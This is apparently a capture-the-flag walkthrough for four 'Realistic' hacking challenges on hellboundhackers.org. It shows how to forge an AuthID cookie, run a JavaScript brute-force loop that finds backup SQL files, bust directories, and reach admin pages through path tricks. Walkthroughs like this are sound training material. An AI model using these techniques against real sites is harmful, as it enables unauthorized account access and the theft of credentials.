###Realistic 1
This challenge has two parts: 1. figuring out how users are authenticated and 2. Finding out the "credentials" for the admin user. 

Fire up something to monitor http requests (Wireshark, Live HTTP Headers, etc.) and monitor your transactions as you login. An element of the response should catch your eye:
```
Set-Cookie	AuthID=4601597
```

If we look at other requests, we can see this AuthID is used anywhere "john doe" is displayed on the page. Let's try to change it and see if we can guess the admin Auth ID:
```
#Typical admin userids
Set-Cookie	AuthID=0
Set-Cookie	AuthID=1

#Maybe admin user is right before or right after?
Set-Cookie	AuthID=4601596
Set-Cookie	AuthID=4601598
```

All these result in the cookie being deleted and us being unauthenticated, so we need to find the actual AuthID used. Log in as 
"johndoe" again and navigate to the "Home" page. Here a link that wasn't there before should pop up at you - "Logs." Navigate to the /logs/ subdirectory and you will see this file:
```
Authorized Users
--------------------------------

user: johndoe
pass: [encrypted]
status: network analysis
last sessionid: [not shown]
******/JohnDoe.txt

---------------------------------
---------------------------------
user: administrator
status: owner
last sessionid: [not shown]
--------------------------------
--------------------------------
```

So there is a text file that contains some information on johndoe. We can either brute-force the directories on the site, or take a guess that the ****** = images. Navigate to the /images/ subdirectory and you should see an administrator.txt with the following:
```
AuthID: 4601420
```

Simply switch your AuthID cookie to that value, and you will now be able to edit the price. 

###Realistic 2
We find that upon entering the /backups/ directory, we are blocked from getting a directory listing. Luckily the challenge text gives us a hint that massively reduces the amount of possibilities:
```
September of 2004. It looks like backup_2004-09-01_1000.sql
```

So our backup file is going to be in the format:
```
backup_2004-09-xx_yy00.sql
```

With only 30 days in September and 24 hours in a day, that leaves us with only 720 combinations to brute-force. We will execute a script against the page to check the urls for us (we have to be on the page due to same-origin policy existing on the XMLHttpRequest) object.
```
function checkURL( url ) {
	var request = new XMLHttpRequest();  
	request.open('GET', url, true);
	request.onreadystatechange = function(){
	    if (request.readyState == 4){
	        if (request.status != 404) {  
	            console.log( url );
	        }  
	    }
	};
	request.send();
}

for( var day = 1; day <= 30; day++ ) {
	for( var hour = 0; hour <= 24; hour++ ) {
		var url_to_check = 'https://www.hellboundhackers.org/challenges/real2/backups/backup_2004-09-' + ( day < 10 ? '0' + day : day ) + '_' + ( hour < 10 ? '0' + hour : hour ) + '00.sql';

		checkURL( url_to_check );
	}
}
```

Executing this script will result in a valid url being outputed; simply download that sql file and open it up to reveal a username : md5. Decrypt the md5 hash to get your admin password.

###Realistic 3
Like most challenges, when we don't know what to do, submitting empty forms tends to get us some information. Go to the order screen and submit an empty request. The error page will reveal an interesting line:
```
error 162: we were unable to write into **************/mem/ file trans***.***
```

Go to each of the subsections and try the /mem/ subdirectory until you stumble on a blank page that doesn't 404. From there it is as easy as running a directory buster on the string /mem/trans{dir} with all file extensions. Eventually you will stumble on a text file that has binary. Simply convert this to ascii for your answer.

###Realistic 4
Not much to go on, so try to submit a fake email address. You'll notice you'll be redirected to an error before you can view the page, so spam esc to stop the redirect. Take a look at the page and you will notice the form submits to /main/mail.php.

With not much else to go on, navigate to /main/, where you will see the member's login page. Login as the given user, and navigate around. You should notice that both news and downloads use:
```
all.php?id= 
```

with different parameters. Keep that in mind for when we want to find different pages.

Go back to main and look at the source code to find a comment that links the admin's login page. SQL injection reveals nothing interesting, so instead, let's try to use the admin path and append pages from the member's access:
```
https://www.hellboundhackers.org/challenges/real4/main/Tlogin/thized_admin/all.php?id=news
``` 

Excellent, we now have admin access without logging in. Next, let's try to abuse all.php to get the records page:
```
https://www.hellboundhackers.org/challenges/real4/main/Tlogin/thized_admin/all.php?id=records
```

To remove records, we will abuse the fact that the site seems to be executing commands straight from the POST parameters:
```
https://www.hellboundhackers.org/challenges/real4/main/Tlogin/thized_admin/all.php?remove=record&&id=Ghost
```

With that, we get a password that we can use to clear logs. Simply abuse the all script again to get the logs page:
```
https://www.hellboundhackers.org/challenges/real4/main/Tlogin/thized_admin/all.php?id=logs
```
